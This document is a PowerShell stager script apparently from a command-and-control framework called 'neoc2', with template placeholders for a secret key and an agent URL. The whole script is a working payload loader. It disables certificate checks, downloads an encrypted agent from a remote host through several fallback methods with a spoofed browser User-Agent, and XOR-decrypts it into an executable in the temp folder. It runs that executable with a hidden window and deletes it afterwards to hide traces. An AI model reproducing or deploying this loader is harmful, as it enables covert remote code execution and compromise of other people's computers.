$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$SecretKey = '{secret_key}'
$AgentUrl = '{full_agent_url}'

$TempEncryptedFile = "$env:TEMP\neoc2_encrypted_$((Get-Random)).txt"
$DecryptedExePath = "$env:TEMP\neoc2_agent_$((Get-Random)).exe"

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
try {
    $webClient.DownloadFile($AgentUrl, $TempEncryptedFile)
} catch {
    try {
        $response = Invoke-WebRequest -Uri $AgentUrl -UseBasicParsing -SkipCertificateCheck
        [System.IO.File]::WriteAllText($TempEncryptedFile, $response.Content)
    } catch {
        try {
            $handler = New-Object System.Net.Http.HttpClientHandler
            $handler.ServerCertificateCustomValidationCallback = {$true}
            $client = New-Object System.Net.Http.HttpClient($handler)
            $task = $client.GetStringAsync($AgentUrl)
            $result = $task.Result
            [System.IO.File]::WriteAllText($TempEncryptedFile, $result)
            $client.Dispose()
        } catch {
        }
    }
}

if (Test-Path $TempEncryptedFile) {
    $EncryptedAgentData = [System.IO.File]::ReadAllText($TempEncryptedFile) -replace '[\r\n\s]', ''
    Remove-Item $TempEncryptedFile -Force -ErrorAction SilentlyContinue

    if ($EncryptedAgentData.Length -gt 0) {
        try {
            $EncryptedBytes = [System.Convert]::FromBase64String($EncryptedAgentData)
        } catch {
            $EncryptedBytes = [System.Text.Encoding]::UTF8.GetBytes($EncryptedAgentData)
        }

        $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($SecretKey)
        $DecryptedBytes = New-Object byte[] $EncryptedBytes.Length

        for ($i = 0; $i -lt $EncryptedBytes.Length; $i++) {
            $DecryptedBytes[$i] = $EncryptedBytes[$i] -bxor $KeyBytes[$i % $KeyBytes.Length]
        }

        [System.IO.File]::WriteAllBytes($DecryptedExePath, $DecryptedBytes)

        if (Test-Path $DecryptedExePath) {
            Start-Process -FilePath $DecryptedExePath -WindowStyle Hidden

            Start-Job -ScriptBlock {
                Start-Sleep -Seconds 10
                if (Test-Path '$DecryptedExePath') {
                    Remove-Item '$DecryptedExePath' -Force -ErrorAction SilentlyContinue
                }
            } | Out-Null
        }
    }
}